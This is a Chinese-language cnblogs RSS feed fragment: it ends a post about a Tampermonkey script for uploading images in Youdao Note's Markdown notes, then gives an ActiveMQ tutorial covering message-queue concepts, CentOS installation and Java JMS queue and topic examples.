    var nameSelector = 'body &amp;gt; dialog-overlay &amp;gt; div &amp;gt; div &amp;gt; div.widget-dialog-body &amp;gt; markdown-upload-image &amp;gt; div &amp;gt; div:nth-child(3) &amp;gt; div.edit-container &amp;gt; input';
    var name = file.name.substring(0, file.name.lastIndexOf('.'));
    $(nameSelector).val(name);
    // 触发 input 事件，更新双向绑定的数据
    tool.trigger(nameSelector, 'input');
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此我们已经实现了有道云笔记支持「Markdown 笔记」上传图片的功能。可以直接将 &lt;a href=&quot;https://github.com/idealism-xxm/tampermonkey/blob/master/note-youdao/src/loader.js&quot; target=&quot;_blank&quot;&gt;loader.js&lt;/a&gt; 中的代码拷贝至 Tampermonkey 中即可实现非会员上传。&lt;/p&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;这一段脚本是两年前写的，但是至今仍旧可以使用。虽然时隔很久，脚本实现的具体细节早已忘记，但是当我看到我这丰富的注释时，还是可以回想起来当时想法及每段代码的逻辑。写注释也是我一直坚持的好习惯，平时写业务代码中没有这么详细的注释去解释每一行的操作逻辑，但仍旧会在每一段相对独立的操作开始时注明其功能等信息。&lt;/p&gt;
&lt;blockquote readability=&quot;3.2459016393443&quot;&gt;
&lt;p&gt;本文首发于公众号：满赋诸机（&lt;a href=&quot;https://mp.weixin.qq.com/s/3JYVFgtxIVR5zoyNhiCSlQ&quot; target=&quot;_blank&quot;&gt;点击查看原文&lt;/a&gt;） 开源在 GitHub ：&lt;a href=&quot;https://github.com/idealism-xxm/tampermonkey/blob/master/note-youdao/detail.md&quot; target=&quot;_blank&quot;&gt;reading-notes/tampermonkey/note-youdao&lt;/a&gt;&lt;br/&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/16055078/103480735-02019200-4e11-11eb-91a2-70a687781033.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 19 Jan 2021 14:49:00 +0000</pubDate>
<dc:creator>满赋诸机</dc:creator>
<og:description>背景 先看一下目前的效果：在「Markdown 笔记」原有的上传图片弹窗中增加了一个我们自定义的上传按钮，通过直接与后端 API 交互完成图片上传（相关 API 是「笔记」上传时公开使用的）。 两年前</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/manfuzhuji/p/14300544.html</dc:identifier>
</item>
<item>
<title>ActiceMQ详解 - MPolaris</title>
<link>http://www.cnblogs.com/mpolaris/p/14295898.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mpolaris/p/14295898.html</guid>
<description>&lt;h4 id=&quot;1-mq理解&quot;&gt;1. MQ理解&lt;/h4&gt;
&lt;h5 id=&quot;11-mq的产品种类和对比&quot;&gt;1.1 MQ的产品种类和对比&lt;/h5&gt;
&lt;p&gt;MQ即消息中间件。MQ是一种理念，ActiveMQ是MQ的落地产品。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;消息中间件产品&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114005458.png&quot; alt=&quot;image-20210114005458326&quot;/&gt;&lt;p&gt;&lt;strong&gt;各类MQ对比&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114005649.png&quot; alt=&quot;image-20210114005649665&quot;/&gt;&lt;ul&gt;&lt;li&gt;Kafka
&lt;ul&gt;&lt;li&gt;编程语言：Scala&lt;/li&gt;
&lt;li&gt;大数据领域的主流MQ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;RabbitMQ
&lt;ul&gt;&lt;li&gt;编程语言：Erlang&lt;/li&gt;
&lt;li&gt;基于erlang语言，不好修改底层，不要查找问题的原因，不建议选用。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;RocketMQ
&lt;ul&gt;&lt;li&gt;编程语言：Java&lt;/li&gt;
&lt;li&gt;适用于大型项目，适用于集群&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;ActiveMQ
&lt;ul&gt;&lt;li&gt;编程语言：Java&lt;/li&gt;
&lt;li&gt;适用于中小型项目&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;12-mq产生背景&quot;&gt;1.2 MQ产生背景&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;系统之间直接调用存在的问题？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;微服务架构后，链式调用是我们在写程序时候的一般流程，为了完成一个整体功能会将其拆分成多个函数（或子模块），比如模块A调用模块B，模块B调用模块C，模块C调用模块D。但在大型分布式应用中，系统间的RPC交互繁杂，一个功能背后要调用上百个接口并非不可能，从单机架构过渡到分布式微服务架构的通例。这些架构会有哪些问题？&lt;/p&gt;
&lt;ul readability=&quot;7&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;系统之间接口耦合比较严重&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每新增一个下游功能，都要对上游的相关接口进行改造。举个例子：如果系统A要发送数据给系统B和系统C，发送给每个系统的数据可能有差异，因此系统A对要发送给每个系统的数据进行了组装，然后逐一发送。当代码上线后又新增了一个需求：把数据也发送给D，新上了一个D系统也要接受A系统的数据，此时就需要修改A系统，让他感知到D系统的存在，同时把数据处理好再给D。在这个过程你会看到每接入一个下游系统都要对系统A进行代码改造，开发联调的效率很低。其整体架构如下图：&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114010537.png&quot; alt=&quot;image-20210114010536965&quot;/&gt;&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;&lt;strong&gt;面对大流量并发时容易被冲垮&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个接口模块的吞吐能力是有限的，这个上限能力如果是堤坝，当大流量（洪水）来临时容易被冲垮。举例秒杀业务：上游系统发起下单购买操作就是下单一个操作很快就完成。然而下游系统要完成秒杀业务后面的所有逻辑（读取订单，库存检查，库存冻结，余额检查，余额冻结，订单生产，余额扣减，库存减少，生成流水，余额解冻，库存解冻）。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;&lt;strong&gt;等待同步存在性能问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;RPC接口上基本都是同步调用，整体的服务性能遵循“木桶理论”，即整体系统的耗时取决于链路中最慢的那个接口。比如A调用B/C/D都是50ms，但此时B又调用了B1，花费2000ms，那么直接就拖累了整个服务性能。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114010955.png&quot; alt=&quot;image-20210114010955756&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;根据上述的几个问题，在设计系统时可以明确要达到的目标：&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;要做到系统解耦，当新的模块接进来时可以做到代码改动最小，能够解耦&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;设置流量缓冲池，可以让后端系统按照自身吞吐能力进行消费不被冲垮，能削峰&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;强弱依赖梳理能将非关键调用链路的操作异步化并提升整体系统的吞吐能力，能够异步&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h5 id=&quot;13-mq主要作用&quot;&gt;1.3 MQ主要作用&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;code&gt;异步&lt;/code&gt;&lt;/strong&gt; 调用者无需等待&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;解耦&lt;/code&gt;&lt;/strong&gt; 解决了系统之间耦合调用的问题&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;消峰&lt;/code&gt;&lt;/strong&gt; 抵御洪峰流量，保护了主业务&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;14-mq的定义&quot;&gt;1.4 MQ的定义&lt;/h5&gt;
&lt;p&gt;面向消息的中间件（&lt;code&gt;message-oriented middleware&lt;/code&gt;）MOM能够很好的解决以上问题。是指利用高效可靠的消息传递机制与平台无关的数据交流，并基于数据通信来进行分布式系统的集成。通过提供消息传递和消息排队模型在分布式环境下提供应用解耦，弹性伸缩，冗余存储、流量削峰，异步通信，数据同步等功能。&lt;/p&gt;
&lt;p&gt;大致的过程是这样的：发送者把消息发送给消息服务器，消息服务器将消息存放在若干队列/主题topic中，在合适的时候消息服务器会将消息转发给接受者。在这个过程中发送和接收是异步的，也就是发送无需等待，而且发送者和接受者的生命周期也没有必然的关系。尤其在发布pub/订阅sub模式下，也可以完成一对多的通信即让一个消息有多个接受者。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114011510.png&quot; alt=&quot;image-20210114011510051&quot;/&gt;&lt;h5 id=&quot;15-mq特点&quot;&gt;1.5 MQ特点&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;采用异步处理模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;消息发送者可以发送一个消息而无须等待响应。消息发送者将消息发送到一条虚拟的通道（主题或者队列）上。消息接收者则订阅或者监听该通道。一条消息可能最终转发给一个或者多个消息接收者，这些消息接收者都无需对消息发送者做出同步回应。整个过程都是异步的。&lt;/p&gt;
&lt;p&gt;案例：也就是说一个系统跟另一个系统之间进行通信的时候，假如系统A希望发送一个消息给系统B让他去处理。但是系统A不关注系统B到底怎么处理或者有没有处理好，所以系统A把消息发送给MQ然后就不管这条消息的“死活了”，接着系统B从MQ里面消费出来处理即可。至于怎么处理，是否处理完毕，什么时候处理都是系统B的事儿与系统A无关。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;应用系统之间解耦合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;发送者和接受者不必了解对方，只需要确认消息。发送者和接受者不必同时在线。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;整体架构&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114012651.png&quot; alt=&quot;image-20210114012651889&quot;/&gt;&lt;p&gt;&lt;strong&gt;MQ缺点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;两个系统之间不能同步调用，不能实时回复，不能响应某个调用的回复。&lt;/p&gt;
&lt;h5 id=&quot;16-centos7安装activemq&quot;&gt;1.6 CentOS7安装ActiveMQ&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;cd /root
mkdir active_mq
tar -xzvf apache-activemq-5.14.0-bin.tar.gz

# /etc/init.d/目录增加增加activemq文件
cd /etc/init.d/
vim activemq

#!/bin/sh
#
# /etc/init.d/activemq
# chkconfig: 345 63 37
# description: activemq servlet container.
# processname: activemq 5.14.0

# Source function library.
#. /etc/init.d/functions
# source networking configuration.
#. /etc/sysconfig/network

export JAVA_HOME=/root/java/jdk1.8.0_221
export CATALINA_HOME=/root/active_mq/apache-activemq-5.14.0

case  $1 in
     start)
         sh $CATALINA_HOME/bin/activemq start
     ;;
     stop)
         sh $CATALINA_HOME/bin/activemq stop
     ;;
     restart)
         sh $CATALINA_HOME/bin/activemq stop
         sleep 1
         sh $CATALINA_HOME/bin/activemq start
     ;;

esac
exit 0

# 对activemq文件授予权限
chmod 777 activemq

# 设置开机启动并启动activemq
chkconfig activemq on
service activemq start

# 启动时指定日志输出文件，activemq日志默认的位置是在：%activemq安装目录%/data/activemq.log
service activemq start  &amp;gt;  /root/active_mq/activemq.log

# 访问地址：http://IP地址:8161/
# 默认账户：admin/admin
# 61616 端口提供JMS服务
# 8161 端口提供管理控制台服务 

# 查看activemq状态
service activemq status

# 关闭activemq服务
service activemq stop
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;2-java程序生成消息基本案例&quot;&gt;2. Java程序生成消息基本案例&lt;/h4&gt;
&lt;h5 id=&quot;21-jms简介&quot;&gt;2.1 JMS简介&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;JMS 总体编码规范&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114235714.png&quot; alt=&quot;image-20210114235714356&quot;/&gt;&lt;p&gt;&lt;strong&gt;JMS开发基本步骤&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210114235837.png&quot; alt=&quot;image-20210114235837770&quot;/&gt;&lt;p&gt;&lt;strong&gt;Destination&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Destination 即目的地。下面拿 jvm 和 mq 做个对比，目的地可以理解为是数据存储的地方。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115001050.png&quot; alt=&quot;image-20210115001050565&quot;/&gt;&lt;p&gt;两种Destination&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115001820.png&quot; alt=&quot;image-20210115001820225&quot;/&gt;&lt;h5 id=&quot;22-idea新建maven工程&quot;&gt;2.2 Idea新建Maven工程&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;!--  activemq 所需要的jar包--&amp;gt;
&amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;org.apache.activemq&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;activemq-all&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;5.15.9&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;

&amp;lt;!--  activemq 和 spring 整合的基础包 --&amp;gt;
&amp;lt;dependency&amp;gt;
        &amp;lt;groupId&amp;gt;org.apache.xbean&amp;lt;/groupId&amp;gt;
        &amp;lt;artifactId&amp;gt;xbean-spring&amp;lt;/artifactId&amp;gt;
        &amp;lt;version&amp;gt;3.16&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;

&amp;lt;!-- junit/log4j等基础配置   --&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.slf4j&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;slf4j-api&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;1.7.25&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;4.12&amp;lt;/version&amp;gt;
    &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;23-队列消息（queue）&quot;&gt;2.3 队列消息（Queue）&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;队列消息特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;点对点消息传递域的特点如下&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;每个消息只能有一个消费者，类似 &lt;span&gt;1对1&lt;/span&gt; 的关系。&lt;/li&gt;
&lt;li&gt;消息的生产者和消费者之间 &lt;span&gt;没有时间上的相关性&lt;/span&gt;。无论消费者在生产者发送消息时是否处于运行状态，消费者都可以提取消息。如我们发送短信，发送者发送后接受者不一定会及收及看。&lt;/li&gt;
&lt;li&gt;消息被消费后队列 &lt;span&gt;不会再存储&lt;/span&gt;，所以消费者 &lt;span&gt;不会消费到已经被消费过的消息。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115210710.png&quot; alt=&quot;image-20210115210703169&quot;/&gt;&lt;p&gt;&lt;strong&gt;队列消息生产者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;

    public static void main(String[] args) throws JMSException {
        //1.创建连接工厂,按照给定的url地址，采用默认用户名和密码
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        //2.通过连接工厂获得连接connection并启动访问
        Connection conn = factory.createConnection();
        conn.start();
        //3.创建会话session
        //  两个参数：事务，签收
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        //4.创建目的地（具体是队列queue还是主题topic）
        //  Destination -&amp;gt; Queue/Topic
        Queue queue = session.createQueue(QUEUE_NAME);
        //5.创建消息的生产者
        MessageProducer producer = session.createProducer(queue);
        //6.通过使用消息生产者发送三条消息到MQ队列中
        for (int i = 0; i &amp;lt; 3; i++) {
            //创建消息
            TextMessage textMessage = session.createTextMessage(&quot;msg -&amp;gt; &quot; + i);
            //通过消息生产者发送给MQ
            producer.send(textMessage);
        }
        //7.关闭资源
        producer.close();
        session.close();
        conn.close();

        System.out.println(&quot;====&amp;gt; 消息发布到MQ完成&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115005955.png&quot; alt=&quot;image-20210115005955450&quot;/&gt;&lt;p&gt;&lt;strong&gt;队列消息消费者 - 同步阻塞式 receive&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);

        // 创建消息的消费者
        MessageConsumer consumer = session.createConsumer(queue);
        while (true) {
            // reveive()：一直等待接收消息，在能够接收到消息之前将一直阻塞。 是同步阻塞方式，和socket的accept方法类似的。
            // reveive(Long time)：等待n毫秒之后还没有收到消息就结束阻塞。
            // 因为消息发送者是 TextMessage，所以消息接受者也要是TextMessage
            TextMessage message = (TextMessage) consumer.receive(4000L);
            if (null != message) {
                System.out.println(&quot;====&amp;gt; 消费者的消息：&quot; + message.getText());
            } else {
                break;
            }
        }

        consumer.close();
        session.close();
        conn.close();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115011322.png&quot; alt=&quot;image-20210115011322834&quot;/&gt;&lt;p&gt;&lt;strong&gt;队列消息消费者 - 异步非阻塞监听式 MessageListener&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;

    public static void main(String[] args) throws Exception {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);
        MessageConsumer consumer = session.createConsumer(queue);

        // 监听器
        consumer.setMessageListener(new MessageListener() {
            @Override
            public void onMessage(Message message) {
                if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
                    TextMessage textMessage = (TextMessage) message;
                    try {
                        System.out.println(&quot;====&amp;gt; 消费者接受到消息：&quot; + textMessage.getText());
                    } catch (JMSException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        System.in.read(); //保证控制台不停

        consumer.close();
        session.close();
        conn.close();
    }
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;消费者三种情况&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;先生产，只启动一个消费者 ① =&amp;gt; ①消费者会消费掉全部消息&lt;/li&gt;
&lt;li&gt;先生产，然后先启动消费者①，再启动消费者② =&amp;gt; ①消费者会消费掉全部消息，②消费者不能消费消息&lt;/li&gt;
&lt;li&gt;先启动消费者①和②，再生产 =&amp;gt; ①和②轮询消费，各自消费一半消息&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;24-主题消息（topic）&quot;&gt;2.4 主题消息（Topic）&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;主题消息特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在发布订阅消息传递域中，目的地被称为主题（topic）。&lt;/p&gt;
&lt;p&gt;发布/订阅消息传递域的特点如下：&lt;/p&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;生产者将消息发布到topic中，每个消息可以有多个消费者，属于&lt;span&gt;1：N的关系。&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;生产者和消费者之间有时间上的相关性。订阅某一个主题的消费者只能消费 &lt;span&gt;自它订阅之后发布的消息。&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;生产者生产时，topic &lt;span&gt;不保存消息&lt;/span&gt;，它是 &lt;span&gt;无状态的&lt;/span&gt; 不落地的，假如无人订阅就去生产那就是一条废消息，所以一般先启动消费者再启动生产者。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;默认情况下如上所述，但是JMS规范允许客户创建持久订阅，这在一定程度上放松了时间上的相关性要求。持久订阅允许消费者消费它在未处于激活状态时发送的消息。一句话，好比我们的微信公众号订阅。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115212650.png&quot; alt=&quot;image-20210115212649958&quot;/&gt;&lt;p&gt;&lt;strong&gt;主题消息生产者&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String TOPIC_NAME = &quot;topic_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);

        //只有这一步和Queue有区别
        Topic topic = session.createTopic(TOPIC_NAME);

        MessageProducer producer = session.createProducer(topic);
        for (int i = 0; i &amp;lt; 3; i++) {
            TextMessage textMessage = session.createTextMessage(&quot;msg -&amp;gt; &quot; + i);
            producer.send(textMessage);
        }
        producer.close();
        session.close();
        conn.close();

        System.out.println(&quot;====&amp;gt; 消息发布到MQ完成&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;主题消息消费者&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;存在多个消费者，每个消费者都能收到自从自己启动后所有生产的消息。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String TOPIC_NAME = &quot;topic_01&quot;;

    public static void main(String[] args) throws Exception {
        System.out.println(&quot;=====&amp;gt; 1号消费者&quot;);//多加几个消费者做实验

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);

        //只有这一步和Queue有区别
        Topic topic = session.createTopic(TOPIC_NAME);

        MessageConsumer consumer = session.createConsumer(topic);
        consumer.setMessageListener(new MessageListener() {
            @Override
            public void onMessage(Message message) {
                if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
                    TextMessage textMessage = (TextMessage) message;
                    try {
                        System.out.println(&quot;====&amp;gt; 消费者接受到消息：&quot; + textMessage.getText());
                    } catch (JMSException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        System.in.read();

        consumer.close();
        session.close();
        conn.close();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115214856.png&quot; alt=&quot;image-20210115214856154&quot;/&gt;&lt;h5 id=&quot;25-topic和queue对比&quot;&gt;2.5 Topic和Queue对比&lt;/h5&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115215226.png&quot; alt=&quot;image-20210115215225937&quot;/&gt;&lt;h4 id=&quot;3-jms-java消息服务-详解&quot;&gt;3. JMS (Java消息服务) 详解&lt;/h4&gt;
&lt;h5 id=&quot;31-java消息服务是什么&quot;&gt;3.1 Java消息服务是什么&lt;/h5&gt;
&lt;p&gt;Java消息服务指的是两个应用程序之间进行异步通信的API，它为标准协议和消息服务提供了一组通用接口，包括创建、发送、读取消息等，用于支持Java应用程序开发。在JavaEE中当两个应用程序使用JMS进行通信时，它们之间不是直接相连的，而是通过一个共同的消息收发服务组件关联起来以达到解耦/异步削峰的效果。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115221749.png&quot; alt=&quot;image-20210115221749323&quot;/&gt;&lt;h5 id=&quot;32-jms四大组成元素&quot;&gt;3.2 JMS四大组成元素&lt;/h5&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115221837.png&quot; alt=&quot;image-20210115221836939&quot;/&gt;&lt;p&gt;&lt;strong&gt;Message - 消息头&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JMS的消息头有哪些属性：&lt;/p&gt;
&lt;ul readability=&quot;6.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;JMSDestination&lt;/code&gt;：消息目的地。主要是指Queue和Topic。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;code&gt;JMSDeliveryMode&lt;/code&gt;：消息持久化模式。分为持久模式和非持久模式，一条持久性的消息应该被传送“一次仅仅一次”，这就意味着如果JMS提供者出现故障，该消息并不会丢失，它会在服务器恢复之后再次传递。一条非持久的消息最多会传递一次，这意味着服务器出现故障，该消息将会永远丢失。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;code&gt;JMSExpiration&lt;/code&gt;：消息过期时间。可以设置消息在一定时间后过期，默认是永不过期消息过期时间，等于Destination的send方法中的timeToLive值加上发送时刻的GMT时间值。如果timeToLive值等于0，则JMSExpiration被设为0，表示该消息永不过期。如果发送后在消息过期时间之后还没有被发送到目的地，则该消息被清除。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;code&gt;JMSPriority&lt;/code&gt;：消息的优先级。消息优先级从0-9十个级别，0-4是普通消息，5-9是加急消息。 JMS不要求MQ严格按照这十个优先级发送消息但必须保证加急消息要先于普通消息到达。默认是4级。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;JMSMessageID&lt;/code&gt;：消息的唯一标识符。唯一标识每个消息的标识由MQ产生，也可以自己指定但是每个消息的标识要求唯一。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;说明：消息的生产者可以set这些属性，消息的消费者可以get这些属性。这些属性在send方法里面也可以设置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String TOPIC_NAME = &quot;topic_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Topic topic = session.createTopic(TOPIC_NAME);
        MessageProducer producer = session.createProducer(topic);
        for (int i = 0; i &amp;lt; 3; i++) {
            TextMessage textMessage = session.createTextMessage(&quot;msg -&amp;gt; &quot; + i);

            //这里可以指定每个消息的目的地
            textMessage.setJMSDestination(topic);
            //消息的模式，持久模式/非持久模式
            textMessage.setJMSDeliveryMode(0);
            //消息的过期时间
            textMessage.setJMSExpiration(1000);
            //消息的优先级
            textMessage.setJMSPriority(10);
            //指定每个消息的标识。MQ会给我们默认生成一个，我们也可以自己指定。
            textMessage.setJMSMessageID(&quot;ABCD&quot;);
            
            //上面的属性也可以通过send重载方法进行设置
            producer.send(textMessage);
        }
        producer.close();
        session.close();
        conn.close();

        System.out.println(&quot;====&amp;gt; 消息发布到MQ完成&quot;);
    }
}
&lt;/code&gt;
